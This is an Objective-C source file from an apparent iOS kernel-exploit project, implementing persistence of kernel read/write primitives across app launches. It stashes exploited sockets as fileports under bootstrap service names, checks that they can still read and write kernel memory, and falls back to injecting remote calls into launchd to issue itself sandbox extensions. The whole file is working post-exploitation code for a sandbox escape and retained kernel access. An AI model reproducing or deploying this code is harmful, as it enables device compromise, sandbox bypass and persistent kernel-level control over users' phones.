//
//  persist.m
//  darksword-kexploit-fun
//
//  Created by Duy Tran on 11/4/26.
//

#import <Foundation/Foundation.h>
#include <errno.h>
#include <string.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include "fileport.h"
#include "darksword.h"
#include "offsets.h"
#include "persistence.h"
#include "utils.h"

#import "TaskRop/RemoteCall.h"

bool recover_proc_self(uint64_t launchd_proc);
static bool self_boot_matches_record(NSDictionary *record);
static bool persist_is_ios16(void);
static bool transfer_krw_to_launchd_ios16(void);

#define PERSIST_RC_TIMEOUT 10000
#define PERSIST_IOS16_RESEARCH_ENABLED 1
#define PERSIST_LOG(...) do { printf("(persist) " __VA_ARGS__); fflush(stdout); } while (0)

// Names must stay stable across launches: the next process looks them up in the
// same bootstrap namespace. Registering twice in one boot fails, which is fine
// because a successful stash happens once per boot.
#define PERSIST_SIMPLE_CONTROL_NAME "com.ffkrw.krw.control"
#define PERSIST_SIMPLE_RW_NAME "com.ffkrw.krw.rw"
#define PERSIST_SIMPLE_KEY @"KRWPrimitiveSimple"
#define PERSIST_LAUNCHD_KEY @"KRWPrimitive"

// The app runs with com.apple.private.security.no-sandbox, so it can register a
// service in its own bootstrap namespace and look it up from the next launch
// without launchd-side sandbox extensions. fileport keeps the socket file
// description alive through the registered send right, which is all kread/kwrite
// need (the kernel-side socket objects are leaked by so_usecount).
static bool gPersistStashed;
static bool gPersistRecovered;
static uint64_t gPersistBase;
static NSString *gPersistChannel;
static NSString *gPersistFailure;

NSString *persist_status_summary(void)
{
    NSDictionary *record = [[NSUserDefaults standardUserDefaults] dictionaryForKey:PERSIST_SIMPLE_KEY]
                        ?: [[NSUserDefaults standardUserDefaults] dictionaryForKey:PERSIST_LAUNCHD_KEY];
    return [NSString stringWithFormat:@"record=%s stashed=%s recovered=%s channel=%s base=0x%llx boot=%s%@",
            record ? "yes" : "no",
            gPersistStashed ? "yes" : "no",
            gPersistRecovered ? "yes" : "no",
            gPersistChannel.UTF8String ?: "none",
            (unsigned long long)(gPersistBase ?: [record[@"KernelBase"] unsignedLongLongValue]),
            (self_boot_matches_record(record) ? "same" : "other"),
            gPersistFailure.length ? [NSString stringWithFormat:@" failure=%@", gPersistFailure] : @""];
}

// kern.bootsessionuuid changes on every boot, and the stashed fileports live in
// kernel memory of the boot that created them, so a record from an older boot is
// guaranteed to be dead and must not cost a lookup.
static NSString *persist_boot_uuid(void)
{
    char uuid[64] = {0};
    size_t size = sizeof(uuid);
    if (sysctlbyname("kern.bootsessionuuid", uuid, &size, NULL, 0) != 0) {
        return nil;
    }
    return [NSString stringWithUTF8String:uuid];
}

static bool self_boot_matches_record(NSDictionary *record)
{
    NSString *recordBoot = record[@"BootUUID"];
    NSString *boot = persist_boot_uuid();
    if (recordBoot.length == 0 || boot.length == 0) {
        return true; // old record without a boot stamp: try it
    }
    return [recordBoot isEqualToString:boot];
}

static void persist_drop_record(NSString *key)
{
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:key];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

// A recovered primitive has to read *and* write. A read-only recovery looks
// healthy in a log and then silently fails on the first write, so exercise kwrite
// by writing back the value that is already there.
static bool persist_verify_fds(int controlFd, int rwFd, uint64_t base)
{
    int previousControl = control_socket;
    int previousRw = rw_socket;
    control_socket = controlFd;
    rw_socket = rwFd;

    bool ok = false;
    uint32_t magic = ds_kread32(base);
    uint32_t cputype = ds_kread32(base + 4);
    if (magic == 0xFEEDFACF && cputype == CPU_TYPE_ARM64) {
        ds_kwrite32(base + 4, cputype);
        ok = ds_kread32(base + 4) == cputype;
    }
    control_socket = previousControl;
    rw_socket = previousRw;
    return ok;
}

// Convert fd into a fileport and prove a fresh fd made from it still works. This
// is the property the next launch depends on, so it is checked before the stash
// is registered rather than after the app has already exited.
static bool persist_probe_fd(int fd, bool controlSide, uint64_t base)
{
    fileport_t port = FILEPORT_NULL;
    if (fileport_makeport(fd, &port) != 0 || port == FILEPORT_NULL) {
        return false;
    }
    int probe = fileport_makefd(port);
    bool ok = false;
    if (probe >= 0) {
        ok = controlSide ? persist_verify_fds(probe, rw_socket, base)
                         : persist_verify_fds(control_socket, probe, base);
        close(probe);
    }
    mach_port_deallocate(mach_task_self(), port);
    return ok;
}

static bool persist_register_name(const char *name, mach_port_t port)
{
    kern_return_t kr = bootstrap_register(bootstrap_port, name, port);
    PERSIST_LOG("simple: bootstrap_register(%s) kr=0x%x (%s)\n", name, kr, mach_error_string(kr));
    return kr == KERN_SUCCESS;
}

static bool persist_simple_stash(void)
{
    PERSIST_LOG("simple: stash begin control_fd=%d rw_fd=%d\n", control_socket, rw_socket);
    if (control_socket < 0 || rw_socket < 0) {
        gPersistFailure = @"no sockets";
        return false;
    }

    if (!persist_probe_fd(control_socket, true, kernel_base)) {
        PERSIST_LOG("simple: control fd does not survive a fileport round trip\n");
        gPersistFailure = @"control fileport round trip";
        return false;
    }
    if (!persist_probe_fd(rw_socket, false, kernel_base)) {
        PERSIST_LOG("simple: rw fd does not survive a fileport round trip\n");
        gPersistFailure = @"rw fileport round trip";
        return false;
    }

    fileport_t controlPort = FILEPORT_NULL;
    int rc = fileport_makeport(control_socket, &controlPort);
    PERSIST_LOG("simple: fileport_makeport(control) rc=%d (%s) port=0x%x\n",
                rc, rc ? strerror(rc) : "ok", controlPort);
    if (rc != 0 || controlPort == FILEPORT_NULL) {
        gPersistFailure = @"fileport_makeport control";
        return false;
    }

    fileport_t rwPort = FILEPORT_NULL;
    rc = fileport_makeport(rw_socket, &rwPort);
    PERSIST_LOG("simple: fileport_makeport(rw) rc=%d (%s) port=0x%x\n",
                rc, rc ? strerror(rc) : "ok", rwPort);
    if (rc != 0 || rwPort == FILEPORT_NULL) {
        gPersistFailure = @"fileport_makeport rw";
        return false;
    }

    if (!persist_register_name(PERSIST_SIMPLE_CONTROL_NAME, controlPort)) {
        gPersistFailure = @"register control";
        return false;
    }
    if (!persist_register_name(PERSIST_SIMPLE_RW_NAME, rwPort)) {
        // Never leave half a stash behind: the name would block the retry for the
        // rest of the boot.
        bootstrap_unregister(bootstrap_port, PERSIST_SIMPLE_CONTROL_NAME);
        gPersistFailure = @"register rw";
        return false;
    }

    NSDictionary *primitive = @{
        @"KernelBase" : @(kernel_base),
        @"KernelSlide" : @(kernel_slide),
        @"BootUUID" : persist_boot_uuid() ?: @"",
        @"Channel" : @"simple",
        @"ControlName" : @(PERSIST_SIMPLE_CONTROL_NAME),
        @"RWName" : @(PERSIST_SIMPLE_RW_NAME),
    };
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:primitive forKey:PERSIST_SIMPLE_KEY];
    [defaults synchronize];
    gPersistStashed = true;
    gPersistChannel = @"simple";
    gPersistBase = kernel_base;
    PERSIST_LOG("simple: stashed base=0x%llx slide=0x%llx boot=%s\n",
                (unsigned long long)kernel_base, (unsigned long long)kernel_slide,
                persist_boot_uuid().UTF8String ?: "?");
    return true;
}

static bool persist_simple_recover(void)
{
    NSDictionary *primitive = [[NSUserDefaults standardUserDefaults] dictionaryForKey:PERSIST_SIMPLE_KEY];
    if (!primitive) {
        PERSIST_LOG("simple: nothing stashed\n");
        return false;
    }

    if (!self_boot_matches_record(primitive)) {
        PERSIST_LOG("simple: stash belongs to an older boot, dropping it\n");
        persist_drop_record(PERSIST_SIMPLE_KEY);
        gPersistFailure = @"stale boot";
        return false;
    }

    const char *controlName = [primitive[@"ControlName"] ?: @(PERSIST_SIMPLE_CONTROL_NAME) UTF8String];
    const char *rwName = [primitive[@"RWName"] ?: @(PERSIST_SIMPLE_RW_NAME) UTF8String];

    mach_port_t controlPort = MACH_PORT_NULL;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, controlName, &controlPort);
    PERSIST_LOG("simple: look_up(%s) kr=0x%x (%s)\n", controlName, kr, mach_error_string(kr));
    if (kr != KERN_SUCCESS) {
        gPersistFailure = @"lookup control";
        persist_drop_record(PERSIST_SIMPLE_KEY);
        return false;
    }

    mach_port_t rwPort = MACH_PORT_NULL;
    kr = bootstrap_look_up(bootstrap_port, rwName, &rwPort);
    PERSIST_LOG("simple: look_up(%s) kr=0x%x (%s)\n", rwName, kr, mach_error_string(kr));
    if (kr != KERN_SUCCESS) {
        gPersistFailure = @"lookup rw";
        persist_drop_record(PERSIST_SIMPLE_KEY);
        return false;
    }

    int controlFd = fileport_makefd(controlPort);
    int rwFd = fileport_makefd(rwPort);
    PERSIST_LOG("simple: fileport_makefd control=%d rw=%d errno=%d\n", controlFd, rwFd, errno);
    if (controlFd < 0 || rwFd < 0) {
        if (controlFd >= 0) close(controlFd);
        if (rwFd >= 0) close(rwFd);
        gPersistFailure = @"makefd";
        persist_drop_record(PERSIST_SIMPLE_KEY);
        return false;
    }

    uint64_t base = [primitive[@"KernelBase"] unsignedLongLongValue];
    uint64_t slide = [primitive[@"KernelSlide"] unsignedLongLongValue];
    if (base == 0) {
        PERSIST_LOG("simple: stashed base is zero\n");
        close(controlFd);
        close(rwFd);
        gPersistFailure = @"zero base";
        persist_drop_record(PERSIST_SIMPLE_KEY);
        return false;
    }

    if (!persist_verify_fds(controlFd, rwFd, base)) {
        PERSIST_LOG("simple: recovered fds do not read/write kernel memory\n");
        close(controlFd);
        close(rwFd);
        bootstrap_unregister(bootstrap_port, controlName);
        bootstrap_unregister(bootstrap_port, rwName);
        gPersistFailure = @"verify";
        persist_drop_record(PERSIST_SIMPLE_KEY);
        return false;
    }

    control_socket = controlFd;
    rw_socket = rwFd;
    kernel_base = base;
    kernel_slide = slide;
    gPersistRecovered = true;
    gPersistChannel = @"simple";
    gPersistBase = base;
    PERSIST_LOG("simple: verified kread/kwrite at 0x%llx\n", (unsigned long long)base);
    return true;
}

bool transfer_krw_to_launchd(void) {
    if (persist_simple_stash()) {
        return true;
    }
    PERSIST_LOG("simple: stash failed, trying launchd RemoteCall path\n");

    bool useIOS16Persistence = persist_is_ios16();

    if (useIOS16Persistence) {
        return transfer_krw_to_launchd_ios16();
    }

    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
    if (!proc) {
        printf("(persist) Failed to create RemoteCall for launchd\n");
        return false;
    }
    uint64_t mem = proc.trojanMem;
    uint64_t tokenRemote;
    proc[mem].string = @(APP_MACH_REGISTER);
    
    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    if (!tokenRemote) {
        printf("(persist) Failed to get token for CONTROL_PORT_NAME\n");
        return false;
    }
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
    
    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
    proc[mem+0x100].string = @(RW_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
    
    // need to strcpy output token because vm_shmem fails for some reason
    kern_return_t kr;
    mach_port_t control_socketPort, rw_socketPort;
    fileport_makeport(control_socket, &control_socketPort);
    fileport_makeport(rw_socket, &rw_socketPort);
    if(!control_socketPort || !rw_socketPort) {
        printf("(persist) fileport_makeport failed\n");
        return false;
    }
    
    NSMutableDictionary *primitive = [NSMutableDictionary dictionary];
    primitive[@"KernelBase"] = @(kernel_base);
    primitive[@"KernelSlide"] = @(kernel_slide);
    primitive[@"LaunchdProcAddr"] = @(lara_procbypid(1));
    primitive[@"BootUUID"] = persist_boot_uuid() ?: @"";
    primitive[@"Channel"] = @"launchd";
    
    // stash ports to launchd and issue sandbox extensions for them
    kr = bootstrap_register(bootstrap_port, CONTROL_PORT_NAME, control_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_register failed for %s: %s\n", CONTROL_PORT_NAME, mach_error_string(kr));
        return false;
    }
    kr = bootstrap_register(bootstrap_port, RW_PORT_NAME, rw_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_register failed for %s: %s\n", RW_PORT_NAME, mach_error_string(kr));
        return false;
    }
    
    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, CONTROL_PORT_NAME, 0);
    proc[mem].string = @(APP_MACH_LOOKUP);
    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    primitive[@"ControlPort"] = proc[mem+0x200].string;
    
    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, RW_PORT_NAME, 0);
    proc[mem+0x100].string = @(RW_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    primitive[@"RWPort"] = proc[mem+0x200].string;
    
    NSLog(@"Primitive: %@", primitive);
    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:@"KRWPrimitive"];
    
    [proc destroyRemoteCall];
    return true;
}

bool recover_krw_primitives(void) {
    if (persist_simple_recover()) {
        PERSIST_LOG("simple: recovered base=0x%llx slide=0x%llx\n",
                    (unsigned long long)kernel_base, (unsigned long long)kernel_slide);
        return true;
    }

    NSDictionary *primitive = [NSUserDefaults.standardUserDefaults dictionaryForKey:PERSIST_LAUNCHD_KEY];
    if (!primitive) {
        PERSIST_LOG("launchd: nothing stashed\n");
        return false;
    }

    if (!self_boot_matches_record(primitive)) {
        PERSIST_LOG("launchd: stash belongs to an older boot, dropping it\n");
        persist_drop_record(PERSIST_LAUNCHD_KEY);
        gPersistFailure = @"stale boot";
        return false;
    }

    kern_return_t kr;
    mach_port_t control_socketPort = MACH_PORT_NULL, rw_socketPort = MACH_PORT_NULL;
    const char *controlName = [primitive[@"ControlPortName"] ?: @(CONTROL_PORT_NAME) UTF8String];
    const char *rwName = [primitive[@"RWPortName"] ?: @(RW_PORT_NAME) UTF8String];

    if (sandbox_extension_consume([primitive[@"ControlPort"] UTF8String] ?: "") < 1 ||
        sandbox_extension_consume([primitive[@"RWPort"] UTF8String] ?: "") < 1) {
        PERSIST_LOG("launchd: sandbox_extension_consume failed\n");
    }

    kr = bootstrap_look_up(bootstrap_port, controlName, &control_socketPort);
    PERSIST_LOG("launchd: look_up(%s) kr=0x%x (%s)\n", controlName, kr, mach_error_string(kr));
    kr = bootstrap_look_up(bootstrap_port, rwName, &rw_socketPort);
    PERSIST_LOG("launchd: look_up(%s) kr=0x%x (%s)\n", rwName, kr, mach_error_string(kr));
    if (kr != KERN_SUCCESS) {
        gPersistFailure = @"launchd lookup";
        persist_drop_record(PERSIST_LAUNCHD_KEY);
        return false;
    }

    int controlFd = fileport_makefd(control_socketPort);
    int rwFd = fileport_makefd(rw_socketPort);
    PERSIST_LOG("launchd: fileport_makefd control=%d rw=%d\n", controlFd, rwFd);
    if (controlFd < 0 || rwFd < 0) {
        if (controlFd >= 0) close(controlFd);
        if (rwFd >= 0) close(rwFd);
        gPersistFailure = @"launchd makefd";
        persist_drop_record(PERSIST_LAUNCHD_KEY);
        return false;
    }

    uint64_t base = [primitive[@"KernelBase"] unsignedLongLongValue];
    uint64_t slide = [primitive[@"KernelSlide"] unsignedLongLongValue];
    if (base == 0 || !persist_verify_fds(controlFd, rwFd, base)) {
        PERSIST_LOG("launchd: recovered fds do not read/write kernel memory\n");
        close(controlFd);
        close(rwFd);
        gPersistFailure = @"launchd verify";
        persist_drop_record(PERSIST_LAUNCHD_KEY);
        return false;
    }

    control_socket = controlFd;
    rw_socket = rwFd;
    kernel_base = base;
    kernel_slide = slide;
    gPersistChannel = @"launchd";
    gPersistBase = base;

    if (!recover_proc_self([primitive[@"LaunchdProcAddr"] unsignedLongLongValue])) {
        PERSIST_LOG("launchd: failed to recover proc_self\n");
        gPersistFailure = @"launchd proc_self";
        return false;
    }

    PERSIST_LOG("launchd: verified kread/kwrite at 0x%llx\n", (unsigned long long)kernel_base);
    gPersistRecovered = true;
    return true;
}

#pragma mark - iOS 16

static bool persist_is_ios16(void) {
#if !PERSIST_IOS16_RESEARCH_ENABLED
    return false;
#endif
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    return version.majorVersion == 16;
}

static bool persist_issue_and_consume_mach_extension(RemoteCall *proc,
                                                     uint64_t mem,
                                                     const char *extension_class,
                                                     const char *name) {
    if (!proc || !extension_class || !name) {
        return false;
    }

    PERSIST_LOG("issue mach extension begin class=%s name=%s\n", extension_class, name);
    proc[mem].string = @(extension_class);
    proc[mem + 0x100].string = @(name);

    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
                                                    proc,
                                                    sandbox_extension_issue_mach,
                                                    mem,
                                                    mem + 0x100,
                                                    0);
    PERSIST_LOG("remote sandbox_extension_issue_mach end token=0x%llx class=%s name=%s\n",
                (unsigned long long)tokenRemote,
                extension_class,
                name);
    if (!tokenRemote) {
        return false;
    }

    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
    NSString *token = proc[mem + 0x200].string;
    if (token.length == 0) {
        return false;
    }

    int64_t consumed = sandbox_extension_consume(token.UTF8String);
    PERSIST_LOG("consume mach extension class=%s name=%s result=%lld\n",
                extension_class,
                name,
                (long long)consumed);
    return consumed >= 1;
}

static NSString *persist_issue_remote_mach_lookup_token(RemoteCall *proc, uint64_t mem, const char *name) {
    if (!proc || !name) {
        return nil;
    }

    proc[mem].string = @(APP_MACH_LOOKUP);
    proc[mem + 0x100].string = @(name);

    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
                                                    proc,
                                                    sandbox_extension_issue_mach,
                                                    mem,
                                                    mem + 0x100,
                                                    0);
    PERSIST_LOG("remote sandbox_extension_issue_mach lookup end token=0x%llx name=%s\n",
                (unsigned long long)tokenRemote,
                name);
    if (!tokenRemote) {
        return nil;
    }

    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
    NSString *token = proc[mem + 0x200].string;
    return token.length ? token : nil;
}

static bool persist_register_bootstrap_port(const char *name, mach_port_t port) {
    if (!name || port == MACH_PORT_NULL) {
        return false;
    }

    kern_return_t kr = bootstrap_register(bootstrap_port, name, port);
    if (kr == KERN_SUCCESS) {
        PERSIST_LOG("bootstrap_register ok for %s\n", name);
        return true;
    }

    PERSIST_LOG("bootstrap_register failed for %s: %s\n", name, mach_error_string(kr));
    return false;
}

static bool transfer_krw_to_launchd_ios16(void) {
    PERSIST_LOG("transfer begin\n");
    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
    if (!proc) {
        NSString *error = [RemoteCall lastInitError];
        PERSIST_LOG("Failed to create RemoteCall for launchd%s%s\n",
                    error.length ? ": " : "",
                    error.length ? error.UTF8String : "");
        return false;
    }

    bool ok = false;
    uint64_t mem = proc.trojanMem;
    mach_port_t control_socketPort = MACH_PORT_NULL;
    mach_port_t rw_socketPort = MACH_PORT_NULL;
    NSString *serviceSuffix = [NSUUID UUID].UUIDString;
    NSString *controlPortName = [NSString stringWithFormat:@"%s.%@", CONTROL_PORT_NAME, serviceSuffix];
    NSString *rwPortName = [NSString stringWithFormat:@"%s.%@", RW_PORT_NAME, serviceSuffix];
    const char *controlName = controlPortName.UTF8String;
    const char *rwName = rwPortName.UTF8String;
    NSString *controlToken = nil;
    NSString *rwToken = nil;
    NSMutableDictionary *primitive = nil;

    if (!persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, controlName) ||
        !persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, rwName)) {
        goto out;
    }

    fileport_makeport(control_socket, &control_socketPort);
    fileport_makeport(rw_socket, &rw_socketPort);
    if (control_socketPort == MACH_PORT_NULL || rw_socketPort == MACH_PORT_NULL) {
        PERSIST_LOG("fileport_makeport failed control=0x%x rw=0x%x\n", control_socketPort, rw_socketPort);
        goto out;
    }

    if (!persist_register_bootstrap_port(controlName, control_socketPort) ||
        !persist_register_bootstrap_port(rwName, rw_socketPort)) {
        goto out;
    }

    controlToken = persist_issue_remote_mach_lookup_token(proc, mem, controlName);
    rwToken = persist_issue_remote_mach_lookup_token(proc, mem, rwName);
    if (controlToken.length == 0 || rwToken.length == 0) {
        goto out;
    }

    primitive = [NSMutableDictionary dictionary];
    primitive[@"KernelBase"] = @(kernel_base);
    primitive[@"KernelSlide"] = @(kernel_slide);
    primitive[@"LaunchdProcAddr"] = @(lara_procbypid(1));
    primitive[@"ControlPort"] = controlToken;
    primitive[@"RWPort"] = rwToken;
    primitive[@"ControlPortName"] = controlPortName;
    primitive[@"RWPortName"] = rwPortName;
    primitive[@"BootUUID"] = persist_boot_uuid() ?: @"";
    primitive[@"Channel"] = @"launchd";

    NSLog(@"Primitive: %@", primitive);
    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:PERSIST_LAUNCHD_KEY];
    [NSUserDefaults.standardUserDefaults synchronize];
    gPersistStashed = true;
    gPersistChannel = @"launchd";
    gPersistBase = kernel_base;
    ok = true;

out:
    if (!ok) {
        PERSIST_LOG("failed to transfer KRW primitives to launchd\n");
    }
    [proc destroyRemoteCall];
    return ok;
}
